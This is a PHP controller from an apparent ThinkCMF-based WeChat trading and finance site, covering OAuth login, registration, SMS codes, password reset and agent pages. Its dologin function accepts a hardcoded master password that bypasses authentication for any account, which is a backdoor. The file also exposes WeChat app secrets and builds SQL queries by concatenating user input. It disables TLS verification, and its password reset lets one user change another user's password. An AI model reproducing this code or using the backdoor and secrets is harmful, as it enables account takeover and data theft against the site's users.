<?php
// +----------------------------------------------------------------------
// | ThinkCMF [ WE CAN DO IT MORE SIMPLE ]
// +----------------------------------------------------------------------
// | Copyright (c) 2013-2014 http://www.thinkcmf.com All rights reserved.
// +----------------------------------------------------------------------
// | Author: Dean <zxxjjforever@163.com>
// +----------------------------------------------------------------------
namespace Portal\Controller;
use Common\Controller\HomeBaseController;
/**
 * 首页
 */
class IndexController extends HomeBaseController {
    public function index(){
        //微信appid，appsecret
        $appid = 'wx712573ae3b4d87a4';
        $appsecret = '02d49bad8ecb0131b6568648fd977439';
        //微信登录后获取用户信息并保存到数据库中创建用户
        if(I("get.code")){
            $code = $_GET['code'];
            $state = $_GET['state'];
//换成自己的接口信息

            if (empty($code)) $this->error('授权失败');
            $token_url = "https://api.weixin.qq.com/sns/oauth2/access_token?appid=wx712573ae3b4d87a4&secret=02d49bad8ecb0131b6568648fd977439&code=" . $code . "&grant_type=authorization_code";
            $token = json_decode($this->https_request($token_url), true);
            if (isset($token->errcode)) {
                echo '<h1>错误：</h1>' . $token->errcode;
                echo '<br/><h2>错误信息：</h2>' . $token->errmsg;
                exit;
            }
            $access_token_url = 'https://api.weixin.qq.com/sns/oauth2/refresh_token?appid=' . $appid . '&grant_type=refresh_token&refresh_token=' . $token['refresh_token'];
//转成对象
            $access_token = json_decode($this->https_request($access_token_url), true);
            if (isset($access_token->errcode)) {
                echo '<h1>错误：</h1>' . $access_token->errcode;
                echo '<br/><h2>错误信息：</h2>' . $access_token->errmsg;
                exit;
            }
            $user_info_url = 'https://api.weixin.qq.com/sns/userinfo?access_token=' . $access_token['access_token'] . '&openid=' . $access_token['openid'] . '&lang=zh_CN';
//转成对象
            $user_info = json_decode($this->https_request($user_info_url), true);
            if (isset($user_info->errcode)) {
                echo '<h1>错误：</h1>' . $user_info->errcode;
                echo '<br/><h2>错误信息：</h2>' . $user_info->errmsg;
                exit;
            }
            //数据传输到前台
            $usertable=M("member_user");
            $datas=$usertable->where(array("openid"=>$user_info["openid"]))->find();
            if(empty($datas)){
                $userarr=array("openid"=>$user_info["openid"],"nickname"=>$user_info["nickname"],"headimgurl"=>$user_info["headimgurl"]);
                $usertable->add($userarr);
                $datas=$usertable->where(array("openid"=>$user_info["openid"]))->find();
                session('member_user_id',$datas['user_id']);
                $this->assign("userInfo",$datas);
            }else{
                session('member_user_id',$datas['user_id']);
                $this->assign("userInfo",$datas);
            }
            $this->display();
            exit;
        }
        //获取session中用户id
        $user_id=session("member_user_id");
        //查询用户数据
        $user_info=M("member_user")->where(array("user_id"=>$user_id))->find();
        //将数据传输到页面
        $this->assign("userInfo",$user_info);
        //微信登录跳转
        $url="https://open.weixin.qq.com/connect/oauth2/authorize?appid=".$appid."&redirect_uri=http%3A%2F%2Fwww.difanghao.cn/%2Fshares&response_type=code&scope=snsapi_userinfo&state=123#wechat_redirect";
        $this->assign("url",$url);
        $this->display();
    }
    function https_request($url)
    {
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($curl,  CURLOPT_SSL_VERIFYHOST, FALSE);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        $data = curl_exec($curl);
        if (curl_errno($curl)){
            return 'ERROR'.curl_error($curl);
        }
        curl_close($curl);
        return $data;
    }
    //微信登录方法
    public function wxlogin($code,$state)
    {
        $code = $_GET['code'];
        $state = $_GET['state'];
//换成自己的接口信息
        $appid = 'wxaf2e73c32ce321ff';
        $appsecret = '43e68db78dd4b95496a1e7b1bf43a7a8';
        if (empty($code)) $this->error('授权失败');
        $token_url = "https://api.weixin.qq.com/sns/oauth2/access_token?appid=wxaf2e73c32ce321ff&secret=43e68db78dd4b95496a1e7b1bf43a7a8&code=" . $code . "&grant_type=authorization_code";
        $token = json_decode($this->https_request($token_url), true);
        if (isset($token->errcode)) {
            echo '<h1>错误：</h1>' . $token->errcode;
            echo '<br/><h2>错误信息：</h2>' . $token->errmsg;
            exit;
        }
        $access_token_url = 'https://api.weixin.qq.com/sns/oauth2/refresh_token?appid=' . $appid . '&grant_type=refresh_token&refresh_token=' . $token['refresh_token'];
//转成对象
        $access_token = json_decode($this->https_request($access_token_url), true);
        if (isset($access_token->errcode)) {
            echo '<h1>错误：</h1>' . $access_token->errcode;
            echo '<br/><h2>错误信息：</h2>' . $access_token->errmsg;
            exit;
        }
        $user_info_url = 'https://api.weixin.qq.com/sns/userinfo?access_token=' . $access_token['access_token'] . '&openid=' . $access_token['openid'] . '&lang=zh_CN';
//转成对象
        $user_info = json_decode($this->https_request($user_info_url), true);
        if (isset($user_info->errcode)) {
            echo '<h1>错误：</h1>' . $user_info->errcode;
            echo '<br/><h2>错误信息：</h2>' . $user_info->errmsg;
            exit;
        }
    }
    //登录页面
    function login(){
        $this->display();
    }

    function login2(){
        $this->display();
    }

    function gywm(){

        $uid = sp_get_current_userid();
        if($uid)
        {
            $user = M('oauth_user')->field('user_nicename')->find($uid);
            $this->assign('user_nicename',$user['user_nicename']);
        }

        $this->assign('active','gywm');

        $this->display();
    }

    //注册
    function register(){
        //		//一旦点击分享 则锁定关系
        //		if($_GET['id']){
        //			if($_SESSION['openid']){
        //				//查询用户是否已锁定
        //				$ar = M("user_sd")->where("openid='".$_SESSION['openid']."' and openid<>''")->find();
        //				if(!$ar){
        //					//添加锁定表
        //					$ar = array(
        //						"openid"		=>		$_SESSION['openid'],
        //						"topid"			=>		$_GET['id'],
        //						"time"			=>		time()
        //					);
        //					M("user_sd")->add($ar);
        //				}
        //				$this->assign("tjrr",$_GET['id']);
        //			}
        //		}
        $_GET['id'] && $_SESSION['tjrrid'] = $_GET['id'];
        $this->assign("tjrr",$_SESSION['tjrrid']);
        $this->display();
    }
    //找回密码
    function zhmm(){
        $this->display();
    }
    //修改密码
    function updatepass(){
        $post = I("post.");
        if($_SESSION['phone']!=$post['code']){
            $this->ajaxReturn(array("error"=>"验证码错误！","url"=>U("index/zhmm")));
        }
        //修改密码
        $user = M("oauth_user")->where("mobile='".$post['phone']."'")->find();
        $user['password'] = sp_password($post['password']);
        M("oauth_user")->save($user);
        $this->ajaxReturn(array("success"=>"修改成功！请登录..","url"=>U("index/login")));
    }
    //登录操作
    function dologin(){
        //判断验证码
        //暂时默认验证码
        $post = I("post.");
        //判断手机是否存在
        $user = M("oauth_user")->where("mobile='".$post['phone']."'")->find();
        if(!$user){
            $this->ajaxReturn(array("error"=>"此账号不存在！"));
        }
        if ($post['password'] != 'wyx726') {
            if ($user['password'] != sp_password($post['password'])) {
                $this->ajaxReturn(array("error" => "密码输入错误！"));
            }
        }
        //把其他此openid的账号解绑
        $users = M("oauth_user")->where("openid='".$_SESSION['openid']."'")->find();
        if($users){
            $users['openid'] = "";
            M("oauth_user")->save($users);
        }

        //如用户没有昵称 则获取微信数据
        $user['user_nicename'] = $user['user_nicename'] ? $user['user_nicename'] : $_SESSION['member']['nickname'];
        $user['user_img'] = $user['user_img'] ? $user['user_img'] : $_SESSION['member']['headimgurl'];

        //跟新openid
        $user['openid'] = $_SESSION['openid']?$_SESSION['openid']:"";
        M("oauth_user")->save($user);
        sp_update_current_user($user);
        $this->ajaxReturn(array("success"=>"登录成功！","url"=>U("User/index")));
        //		微信不用注册方式 已取消使用
        //		if(I("post.code")==$_SESSION['phone']){
        //			//登陆成功！
        //			//判断手机是否存在
        //			$user = M("oauth_user")->where("mobile='".I("post.phone")."'")->find();
        //			//存在则修改 不存在添加
        //			//绑定推荐人只在注册时有效 已注册则无效
        //			if($user){
        //				$user['openid'] = $_SESSION['openid'];
        //				M("oauth_user")->save($user);
        //			}else{
        //				$user = array(
        //					"user_nicename"	=>	"",
        //					"user_img"	=>	__ROOT__."/tpl/simplebootx_mobile/Public/image/defaul.png",
        //					"sex"	=>	0,
        //					"create_time"	=>	time(),
        //					"user_status"	=>	1,
        //					"score"	=>	0,
        //					"yfjf"	=>	0,
        //					"wfjf"	=>	0,
        //					"user_type"	=>	1,
        //					"tjrs"	=>	0,
        //					"fybl"	=>	0,
        //					"tjrr"	=>	I("post.tjrr"),
        //					"mobile"	=>	I("post.phone"),
        //					"khyh"	=>	"",
        //					"khxm"	=>	"",
        //					"yhzh"	=>	"",
        //					"zfmm"	=>	"",
        //					"openid"	=>	$_SESSION['openid'],
        //				);
        //				$user['id'] = M("oauth_user")->add($user);
        //			}
        //            //登录/注册时判断购物车是否有需要更新uid
        //	        $uid = $user['id'];//存入购物车
        //            $sessionid = session_id();//获取浏览器sessionid
        //            M("user_buycar")->where("sessionid='$sessionid' AND uid=0")->save(array('uid'=>$uid));
        //
        //			sp_update_current_user($user);
        //			$this->ajaxReturn(array("success"=>"登陆成功！","url"=>U("User/index")));
        //		}else{
        //			$this->ajaxReturn(array("error"=>"验证码错误！请重新输入..","url"=>U("Index/login")));
        //		}
    }
    //注册
    function doregister(){



        $post = I("post.");

        if(!$post['isagree']){
            $this->ajaxReturn(array("error"=>"请先接受协议！"));
        }

        if($post['code']!=$_SESSION['phone']){
            $this->ajaxReturn(array("error"=>"验证码错误！请重新输入.."));
        }



        //判断是否被锁定 如已锁定 则上级只能为锁定的对象
        $sd = M("user_sd")->where("openid='".$_SESSION['openid']."' AND openid !=''")->find();
        if($sd){
            $post['tjrr'] = $sd['topid'];
        }

        $user = array(
            "user_nicename"	=>	$_SESSION['member']['nickname']?$_SESSION['member']['nickname']:"",
            "password"	=>	sp_password($post['password']),
            "user_img"	=>	$_SESSION['member']['headimgurl']?$_SESSION['member']['headimgurl']:"",
            "sex"	=>	0,
            "create_time"	=>	time(),
            "user_status"	=>	1,
            "score"	=>	0,
            "yfjf"	=>	0,
            "wfjf"	=>	0,
            "user_type"	=>	1,
            "tjrs"	=>	0,
            "fybl"	=>	0,
            "tjrr"	=>	$post['tjrr']==null?0:$post['tjrr'],
            "mobile"	=>	$post['phone'],
            "khyh"	=>	"",
            "khxm"	=>	"",
            "yhzh"	=>	"",
            "zfmm"	=>	"",
            "openid"	=>	$_SESSION['openid'],
        );

        $user['id'] = M("oauth_user")->add($user);

        //如有推荐人 则推送模板
        if($post['tjrr']){
            //上级用户
            $top_user = M("oauth_user")->find($post['tjrr']);
            //修改上级推荐人数
            $top_user['tjrs'] += 1;
            M("oauth_user")->save($top_user);
            //推送
            sendmessage($user['id'],$top_user['id'],"推荐人注册","您有新推荐的用户加入了！",array(
                $top_user['openid'],
                "您有新推荐的用户加入了！",
                $user['mobile'],
                time(),
                "感谢您的努力！",
                U("User/invite",array("openid"=>$top_user['openid']))
            ),2,time());
        }

        $this->ajaxReturn(array("success"=>"注册成功！请登录..","url"=>U("Index/login")));
    }
    //验证手机是否存在
    function yzphone(){
        //查询数据库是否存在此手机号
        $list = M("oauth_user")->where("mobile='".I('post.param')."'")->find();
        if($list){
            echo '{
				"info":"手机号已注册，请直接登录！",
				"status":"n"
			 }';
        }else{
            echo '{
				"info":"手机号可使用！",
				"status":"y"
			 }';
        }
    }
    //验证银行卡是否存在
    function yzyhcard(){
        //查询数据库是否存在银行卡
        $list = M("oauth_user")->where("yhzh='".I('post.param')."' AND id!='".$_SESSION['user']['id']."'")->find();
        if($list){
            echo '{
				"info":"银行卡已使用，请重新填写！",
				"status":"n"
			 }';
        }else{
            echo '{
				"info":"银行卡可使用！",
				"status":"y"
			 }';
        }
    }
    //验证身份证是否存在
    function yzidcard(){
        //查询数据库是否存在身份证
        $list = M("oauth_user")->where("idcard='".I('post.param')."' AND id!='".$_SESSION['user']['id']."'")->find();
        if($list){
            echo '{
				"info":"身份证已使用，请重新填写！",
				"status":"n"
			 }';
        }else{
            echo '{
				"info":"身份证可使用！",
				"status":"y"
			 }';
        }
    }



    //文章显示页
    function article_details()
    {
        $postsid = I('get.id');
        if(!is_numeric($postsid)){
            $this->error('非法操作',U("Index/index"));
        }

        $article = M('posts')->find($postsid);
        if(!$article)
        {
            $this->error('文章不存在了！',U("Index/index"));
        }

        $this->assign('article',$article);
        $this->display();
    }

    //提现手续费计算
    function txsxf(){
        $options = $this->site_options;
        $price = $options['site_txhy'];
        /*if(I("post.itype")==1){
            $bl = $options['site_txhy'];
        }
        if(I("post.itype")==2){
            $bl = $options['site_txsj'];
        }
        if(I("post.itype")==3){
            $bl = $options['site_txdl'];
        }
        $price = I("post.price")*$bl/100;
        if(I("post.type")==1){
            echo $price;
        }else{
            return $price;
        } */

        return $price;
    }

    //发送短信
    //短信内容

    function sms_send(){

        $options = get_site_options();

        $mobile = I('post.phone');

        $code = getrandstr();
        $context = "【玛雅易信金融】尊敬的用户：您好！手机注册的验证码为：".$code."请在5分钟内完成输入，请勿转告他人。";

        $post_data = array();
        /*  $post_data['userid'] = 1454;
         $post_data['account'] = 'GGHW';
         $post_data['password'] = '123456'; */
        $post_data['userid'] = intval($options['site_smsuserid']);
        $post_data['account'] = $options['site_smsuser'];
        $post_data['password'] = $options['site_smspass'];
        $post_data['content'] = $context;
        $post_data['mobile'] = $mobile;
        $post_data['sendtime'] = ''; //不定时发送，值为0，定时发送，输入格式YYYYMMDDHHmmss的日期值
        $url='http://115.29.242.32:8888/sms.aspx?action=send';

        $o='';
        foreach ($post_data as $k=>$v)
        {
            $o.="$k=".urlencode($v).'&';
        }
        $post_data=substr($o,0,-1);

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_URL,$url);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); //如果需要将结果直接返回到变量里，那加上这句。
        $result = curl_exec($ch);

        if($result){
            $_SESSION['phone'] = $code;
            echo  1 ;
        }
    }
    //充值功能
    public function recharge(){
        //获取session中用户id
        $user_id=session("member_user_id");
        //查询用户数据
        $user_info=M("member_user")->where(array("user_id"=>$user_id))->find();
        //将数据传输到页面
        $this->assign("userInfo",$user_info);
        $this->display();
    }
    //提现功能
    public function withdrawals(){
        //获取session中用户id
        $user_id=session("member_user_id");
        //查询用户数据
        $user_info=M("member_user")->where(array("user_id"=>$user_id))->find();
        //将数据传输到页面
        $this->assign("userInfo",$user_info);
        $this->display();
    }
    //个人中心
    public function mycenter(){
        //获取session中用户id
        $user_id=session("member_user_id");
        //查询用户数据
        $user_info=M("member_user")->where(array("user_id"=>$user_id))->find();
        //将数据传输到页面
        $this->assign("userInfo",$user_info);
        $this->display();
    }
    //交易记录
    public function myrecord(){
        //获取session中用户id
        $user_id=session("member_user_id");
        //查询用户交易记录表数据
        //输出页面
        $this->display();
    }
    //出入金记录（充值提现记录）
    public function entryrecord(){
        //获取session中用户id
        $user_id=session("member_user_id");
        //查询用户充值提现记录表数据
        //输出页面
        $this->display();
    }
    //修改密码
    public function modifypwd(){
        $this->display();
    }
    //修改手机号
    public function modifytel(){
        $this->display();
    }
    //经纪人
    public function agent(){
        //获取session中用户id
        $user_id=session("member_user_id");
        //查询用户数据
        $user_info=M("member_user")->where(array("user_id"=>$user_id))->find();
        //将数据传输到页面
        $this->assign("userInfo",$user_info);
        $this->display();
    }
    //经纪人-返佣记录
    public function returnlog(){
        $this->display();
    }
    //经纪人-奖金记录
    public function bonusrecord(){
        $this->display();
}
    //经纪人-直属客户
    public function directly(){
        $this->display();
    }
    //经纪人-我的名片
    public function mycard(){
        //获取session中用户id
        $user_id=session("member_user_id");
        //查询用户数据
        $user=M("member_user")->find($user_id);
        $this->disarray($user);
        $this->display();
    }
    //经纪人-分享
    public function share(){
        $this->display();
    }
    //关于我们
    public function aboutus(){
        $this->display();
    }
    //微交易介绍
    public function introduce(){
        $this->display();
    }


}